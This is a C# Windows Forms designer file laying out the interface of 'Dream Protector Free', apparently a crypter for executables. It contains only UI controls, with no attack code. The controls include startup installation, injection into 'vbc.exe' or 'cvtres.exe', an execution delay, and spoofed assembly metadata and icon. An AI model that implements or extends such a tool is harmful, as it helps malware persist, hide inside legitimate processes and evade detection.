﻿namespace Dream_Protector_Free
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.button1 = new System.Windows.Forms.Button();
            this.inputFileText = new System.Windows.Forms.TextBox();
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.groupBox4 = new System.Windows.Forms.GroupBox();
            this.label3 = new System.Windows.Forms.Label();
            this.delayNum = new System.Windows.Forms.NumericUpDown();
            this.delayCheck = new System.Windows.Forms.CheckBox();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.vbcRadio = new System.Windows.Forms.RadioButton();
            this.cvtresRadio = new System.Windows.Forms.RadioButton();
            this.itselfRadio = new System.Windows.Forms.RadioButton();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.button3 = new System.Windows.Forms.Button();
            this.processNameText = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.startupNameText = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.installCheck = new System.Windows.Forms.CheckBox();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.button5 = new System.Windows.Forms.Button();
            this.groupBox5 = new System.Windows.Forms.GroupBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.button4 = new System.Windows.Forms.Button();
            this.iconText = new System.Windows.Forms.TextBox();
            this.asmVersionText = new System.Windows.Forms.TextBox();
            this.label8 = new System.Windows.Forms.Label();
            this.asmCopyrightText = new System.Windows.Forms.TextBox();
            this.label7 = new System.Windows.Forms.Label();
            this.asmCompanyText = new System.Windows.Forms.TextBox();
            this.label6 = new System.Windows.Forms.Label();
            this.asmProductNameText = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.asmDescriptionText = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.imageList2 = new System.Windows.Forms.ImageList(this.components);
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.button2 = new System.Windows.Forms.Button();
            this.nativeListView1 = new Dream_Protector_Free.UI.NativeListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.label9 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.groupBox1.SuspendLayout();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.groupBox4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.delayNum)).BeginInit();
            this.groupBox3.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.groupBox5.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.tabPage3.SuspendLayout();
            this.tabPage4.SuspendLayout();
            this.SuspendLayout();
            // 
            // groupBox1
            // 
            this.groupBox1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.groupBox1.Controls.Add(this.button1);
            this.groupBox1.Controls.Add(this.inputFileText);
            this.groupBox1.Location = new System.Drawing.Point(12, 12);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(315, 50);
            this.groupBox1.TabIndex = 0;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "File :";
            // 
            // button1
            // 
            this.button1.Image = global::Dream_Protector_Free.Properties.Resources.file_manager;
            this.button1.Location = new System.Drawing.Point(227, 21);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(82, 23);
            this.button1.TabIndex = 1;
            this.button1.Text = "Browse...";
            this.button1.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.button1.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageBeforeText;
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // inputFileText
            // 
            this.inputFileText.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.inputFileText.Location = new System.Drawing.Point(6, 21);
            this.inputFileText.Name = "inputFileText";
            this.inputFileText.Size = new System.Drawing.Size(215, 22);
            this.inputFileText.TabIndex = 0;
            // 
            // tabControl1
            // 
            this.tabControl1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Controls.Add(this.tabPage3);
            this.tabControl1.Controls.Add(this.tabPage4);
            this.tabControl1.ImageList = this.imageList1;
            this.tabControl1.Location = new System.Drawing.Point(12, 68);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(315, 257);
            this.tabControl1.TabIndex = 1;
            // 
            // tabPage1
            // 
            this.tabPage1.Controls.Add(this.groupBox4);
            this.tabPage1.Controls.Add(this.groupBox3);
            this.tabPage1.Controls.Add(this.groupBox2);
            this.tabPage1.ImageKey = "wrench.png";
            this.tabPage1.Location = new System.Drawing.Point(4, 23);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(307, 230);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Options";
            this.tabPage1.UseVisualStyleBackColor = true;
            // 
            // groupBox4
            // 
            this.groupBox4.Controls.Add(this.label3);
            this.groupBox4.Controls.Add(this.delayNum);
            this.groupBox4.Controls.Add(this.delayCheck);
            this.groupBox4.Location = new System.Drawing.Point(6, 168);
            this.groupBox4.Name = "groupBox4";
            this.groupBox4.Size = new System.Drawing.Size(295, 53);
            this.groupBox4.TabIndex = 2;
            this.groupBox4.TabStop = false;
            this.groupBox4.Text = "Delay";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(222, 25);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(49, 13);
            this.label3.TabIndex = 2;
            this.label3.Text = "seconds";
            // 
            // delayNum
            // 
            this.delayNum.Location = new System.Drawing.Point(6, 23);
            this.delayNum.Maximum = new decimal(new int[] {
            99999999,
            0,
            0,
            0});
            this.delayNum.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.delayNum.Name = "delayNum";
            this.delayNum.Size = new System.Drawing.Size(210, 22);
            this.delayNum.TabIndex = 1;
            this.delayNum.Value = new decimal(new int[] {
            1,
            0,
            0,
            0});
            // 
            // delayCheck
            // 
            this.delayCheck.AutoSize = true;
            this.delayCheck.BackColor = System.Drawing.Color.White;
            this.delayCheck.Location = new System.Drawing.Point(225, 0);
            this.delayCheck.Name = "delayCheck";
            this.delayCheck.Size = new System.Drawing.Size(61, 17);
            this.delayCheck.TabIndex = 0;
            this.delayCheck.Text = "Enable";
            this.delayCheck.UseVisualStyleBackColor = false;
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.vbcRadio);
            this.groupBox3.Controls.Add(this.cvtresRadio);
            this.groupBox3.Controls.Add(this.itselfRadio);
            this.groupBox3.Location = new System.Drawing.Point(6, 118);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(295, 44);
            this.groupBox3.TabIndex = 1;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Injection";
            // 
            // vbcRadio
            // 
            this.vbcRadio.AutoSize = true;
            this.vbcRadio.Location = new System.Drawing.Point(144, 21);
            this.vbcRadio.Name = "vbcRadio";
            this.vbcRadio.Size = new System.Drawing.Size(62, 17);
            this.vbcRadio.TabIndex = 2;
            this.vbcRadio.Text = "vbc.exe";
            this.vbcRadio.UseVisualStyleBackColor = true;
            // 
            // cvtresRadio
            // 
            this.cvtresRadio.AutoSize = true;
            this.cvtresRadio.Location = new System.Drawing.Point(62, 21);
            this.cvtresRadio.Name = "cvtresRadio";
            this.cvtresRadio.Size = new System.Drawing.Size(74, 17);
            this.cvtresRadio.TabIndex = 1;
            this.cvtresRadio.Text = "cvtres.exe";
            this.cvtresRadio.UseVisualStyleBackColor = true;
            // 
            // itselfRadio
            // 
            this.itselfRadio.AutoSize = true;
            this.itselfRadio.Checked = true;
            this.itselfRadio.Location = new System.Drawing.Point(6, 21);
            this.itselfRadio.Name = "itselfRadio";
            this.itselfRadio.Size = new System.Drawing.Size(50, 17);
            this.itselfRadio.TabIndex = 0;
            this.itselfRadio.TabStop = true;
            this.itselfRadio.Text = "Itself";
            this.itselfRadio.UseVisualStyleBackColor = true;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.button3);
            this.groupBox2.Controls.Add(this.processNameText);
            this.groupBox2.Controls.Add(this.label2);
            this.groupBox2.Controls.Add(this.startupNameText);
            this.groupBox2.Controls.Add(this.label1);
            this.groupBox2.Controls.Add(this.installCheck);
            this.groupBox2.Location = new System.Drawing.Point(6, 6);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(295, 106);
            this.groupBox2.TabIndex = 0;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Installation";
            // 
            // button3
            // 
            this.button3.Image = global::Dream_Protector_Free.Properties.Resources.arrow_refresh;
            this.button3.Location = new System.Drawing.Point(95, 77);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(194, 23);
            this.button3.TabIndex = 5;
            this.button3.Text = "Random";
            this.button3.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.button3.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageBeforeText;
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // processNameText
            // 
            this.processNameText.Location = new System.Drawing.Point(92, 49);
            this.processNameText.Name = "processNameText";
            this.processNameText.Size = new System.Drawing.Size(197, 22);
            this.processNameText.TabIndex = 4;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(3, 52);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(83, 13);
            this.label2.TabIndex = 3;
            this.label2.Text = "Process Name :";
            // 
            // startupNameText
            // 
            this.startupNameText.Location = new System.Drawing.Point(92, 21);
            this.startupNameText.Name = "startupNameText";
            this.startupNameText.Size = new System.Drawing.Size(197, 22);
            this.startupNameText.TabIndex = 2;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(3, 24);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(83, 13);
            this.label1.TabIndex = 1;
            this.label1.Text = "Startup Name :";
            // 
            // installCheck
            // 
            this.installCheck.AutoSize = true;
            this.installCheck.BackColor = System.Drawing.Color.White;
            this.installCheck.Location = new System.Drawing.Point(225, 0);
            this.installCheck.Name = "installCheck";
            this.installCheck.Size = new System.Drawing.Size(61, 17);
            this.installCheck.TabIndex = 0;
            this.installCheck.Text = "Enable";
            this.installCheck.UseVisualStyleBackColor = false;
            // 
            // tabPage2
            // 
            this.tabPage2.Controls.Add(this.button5);
            this.tabPage2.Controls.Add(this.groupBox5);
            this.tabPage2.Controls.Add(this.asmVersionText);
            this.tabPage2.Controls.Add(this.label8);
            this.tabPage2.Controls.Add(this.asmCopyrightText);
            this.tabPage2.Controls.Add(this.label7);
            this.tabPage2.Controls.Add(this.asmCompanyText);
            this.tabPage2.Controls.Add(this.label6);
            this.tabPage2.Controls.Add(this.asmProductNameText);
            this.tabPage2.Controls.Add(this.label5);
            this.tabPage2.Controls.Add(this.asmDescriptionText);
            this.tabPage2.Controls.Add(this.label4);
            this.tabPage2.ImageKey = "application_view_list.png";
            this.tabPage2.Location = new System.Drawing.Point(4, 23);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(307, 230);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Assembly";
            this.tabPage2.UseVisualStyleBackColor = true;
            // 
            // button5
            // 
            this.button5.Image = global::Dream_Protector_Free.Properties.Resources.arrow_refresh;
            this.button5.ImageAlign = System.Drawing.ContentAlignment.TopLeft;
            this.button5.Location = new System.Drawing.Point(277, 6);
            this.button5.Name = "button5";
            this.button5.Size = new System.Drawing.Size(24, 134);
            this.button5.TabIndex = 11;
            this.button5.Text = "Random";
            this.button5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.button5.UseVisualStyleBackColor = true;
            this.button5.Click += new System.EventHandler(this.button5_Click);
            // 
            // groupBox5
            // 
            this.groupBox5.Controls.Add(this.pictureBox1);
            this.groupBox5.Controls.Add(this.button4);
            this.groupBox5.Controls.Add(this.iconText);
            this.groupBox5.Location = new System.Drawing.Point(9, 146);
            this.groupBox5.Name = "groupBox5";
            this.groupBox5.Size = new System.Drawing.Size(292, 78);
            this.groupBox5.TabIndex = 10;
            this.groupBox5.TabStop = false;
            this.groupBox5.Text = "Icon :";
            // 
            // pictureBox1
            // 
            this.pictureBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.pictureBox1.Location = new System.Drawing.Point(6, 21);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(48, 48);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 4;
            this.pictureBox1.TabStop = false;
            // 
            // button4
            // 
            this.button4.Image = global::Dream_Protector_Free.Properties.Resources.file_manager;
            this.button4.Location = new System.Drawing.Point(204, 49);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(82, 23);
            this.button4.TabIndex = 3;
            this.button4.Text = "Browse...";
            this.button4.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.button4.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageBeforeText;
            this.button4.UseVisualStyleBackColor = true;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // iconText
            // 
            this.iconText.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.iconText.Location = new System.Drawing.Point(60, 21);
            this.iconText.Name = "iconText";
            this.iconText.Size = new System.Drawing.Size(226, 22);
            this.iconText.TabIndex = 2;
            // 
            // asmVersionText
            // 
            this.asmVersionText.Location = new System.Drawing.Point(97, 118);
            this.asmVersionText.Name = "asmVersionText";
            this.asmVersionText.Size = new System.Drawing.Size(174, 22);
            this.asmVersionText.TabIndex = 9;
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(6, 121);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(52, 13);
            this.label8.TabIndex = 8;
            this.label8.Text = "Version :";
            // 
            // asmCopyrightText
            // 
            this.asmCopyrightText.Location = new System.Drawing.Point(97, 90);
            this.asmCopyrightText.Name = "asmCopyrightText";
            this.asmCopyrightText.Size = new System.Drawing.Size(174, 22);
            this.asmCopyrightText.TabIndex = 7;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(6, 93);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(64, 13);
            this.label7.TabIndex = 6;
            this.label7.Text = "Copyright :";
            // 
            // asmCompanyText
            // 
            this.asmCompanyText.Location = new System.Drawing.Point(97, 62);
            this.asmCompanyText.Name = "asmCompanyText";
            this.asmCompanyText.Size = new System.Drawing.Size(174, 22);
            this.asmCompanyText.TabIndex = 5;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(6, 65);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(61, 13);
            this.label6.TabIndex = 4;
            this.label6.Text = "Company :";
            // 
            // asmProductNameText
            // 
            this.asmProductNameText.Location = new System.Drawing.Point(97, 34);
            this.asmProductNameText.Name = "asmProductNameText";
            this.asmProductNameText.Size = new System.Drawing.Size(174, 22);
            this.asmProductNameText.TabIndex = 3;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(6, 37);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(85, 13);
            this.label5.TabIndex = 2;
            this.label5.Text = "Product Name :";
            // 
            // asmDescriptionText
            // 
            this.asmDescriptionText.Location = new System.Drawing.Point(97, 6);
            this.asmDescriptionText.Name = "asmDescriptionText";
            this.asmDescriptionText.Size = new System.Drawing.Size(174, 22);
            this.asmDescriptionText.TabIndex = 1;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(6, 9);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(72, 13);
            this.label4.TabIndex = 0;
            this.label4.Text = "Description :";
            // 
            // tabPage3
            // 
            this.tabPage3.Controls.Add(this.nativeListView1);
            this.tabPage3.ImageKey = "bug.png";
            this.tabPage3.Location = new System.Drawing.Point(4, 23);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage3.Size = new System.Drawing.Size(307, 230);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Build Log";
            this.tabPage3.UseVisualStyleBackColor = true;
            // 
            // imageList2
            // 
            this.imageList2.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList2.ImageStream")));
            this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList2.Images.SetKeyName(0, "information.png");
            this.imageList2.Images.SetKeyName(1, "warning.png");
            this.imageList2.Images.SetKeyName(2, "delete.png");
            this.imageList2.Images.SetKeyName(3, "accept_button.png");
            // 
            // tabPage4
            // 
            this.tabPage4.Controls.Add(this.label11);
            this.tabPage4.Controls.Add(this.label10);
            this.tabPage4.Controls.Add(this.label9);
            this.tabPage4.ImageKey = "information.png";
            this.tabPage4.Location = new System.Drawing.Point(4, 23);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage4.Size = new System.Drawing.Size(307, 230);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "About";
            this.tabPage4.UseVisualStyleBackColor = true;
            // 
            // imageList1
            // 
            this.imageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList1.ImageStream")));
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "wrench.png");
            this.imageList1.Images.SetKeyName(1, "application_view_list.png");
            this.imageList1.Images.SetKeyName(2, "bug.png");
            this.imageList1.Images.SetKeyName(3, "information.png");
            // 
            // button2
            // 
            this.button2.Image = global::Dream_Protector_Free.Properties.Resources._lock;
            this.button2.Location = new System.Drawing.Point(12, 331);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(315, 23);
            this.button2.TabIndex = 2;
            this.button2.Text = "Protect...";
            this.button2.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.button2.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageBeforeText;
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // nativeListView1
            // 
            this.nativeListView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2});
            this.nativeListView1.FullRowSelect = true;
            this.nativeListView1.Location = new System.Drawing.Point(6, 6);
            this.nativeListView1.Name = "nativeListView1";
            this.nativeListView1.Size = new System.Drawing.Size(295, 218);
            this.nativeListView1.SmallImageList = this.imageList2;
            this.nativeListView1.TabIndex = 0;
            this.nativeListView1.UseCompatibleStateImageBehavior = false;
            this.nativeListView1.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Time";
            this.columnHeader1.Width = 80;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Message";
            this.columnHeader2.Width = 210;
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Segoe UI Semibold", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.Location = new System.Drawing.Point(47, 23);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(221, 30);
            this.label9.TabIndex = 0;
            this.label9.Text = "Dream Protector Free";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label10.Location = new System.Drawing.Point(48, 73);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(146, 20);
            this.label10.TabIndex = 1;
            this.label10.Text = "Coded by Paskowsky";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label11.Location = new System.Drawing.Point(48, 53);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(110, 20);
            this.label11.TabIndex = 2;
            this.label11.Text = "Version : 1.0.0.0";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            this.ClientSize = new System.Drawing.Size(339, 360);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.tabControl1);
            this.Controls.Add(this.groupBox1);
            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.Text = "Dream Protector Free by Paskowsky";
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.groupBox4.ResumeLayout(false);
            this.groupBox4.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.delayNum)).EndInit();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            this.groupBox5.ResumeLayout(false);
            this.groupBox5.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.tabPage3.ResumeLayout(false);
            this.tabPage4.ResumeLayout(false);
            this.tabPage4.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.TextBox inputFileText;
        private System.Windows.Forms.TabControl tabControl1;
        private System.Windows.Forms.TabPage tabPage1;
        private System.Windows.Forms.TabPage tabPage2;
        private System.Windows.Forms.TabPage tabPage3;
        private System.Windows.Forms.TabPage tabPage4;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.ImageList imageList1;
        private UI.NativeListView nativeListView1;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private System.Windows.Forms.ImageList imageList2;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.TextBox processNameText;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox startupNameText;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.CheckBox installCheck;
        private System.Windows.Forms.GroupBox groupBox4;
        private System.Windows.Forms.CheckBox delayCheck;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.RadioButton vbcRadio;
        private System.Windows.Forms.RadioButton cvtresRadio;
        private System.Windows.Forms.RadioButton itselfRadio;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.NumericUpDown delayNum;
        private System.Windows.Forms.TextBox asmVersionText;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.TextBox asmCopyrightText;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.TextBox asmCompanyText;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.TextBox asmProductNameText;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.TextBox asmDescriptionText;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Button button5;
        private System.Windows.Forms.GroupBox groupBox5;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Button button4;
        private System.Windows.Forms.TextBox iconText;
        private System.Windows.Forms.Label label11;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Label label9;
    }
}

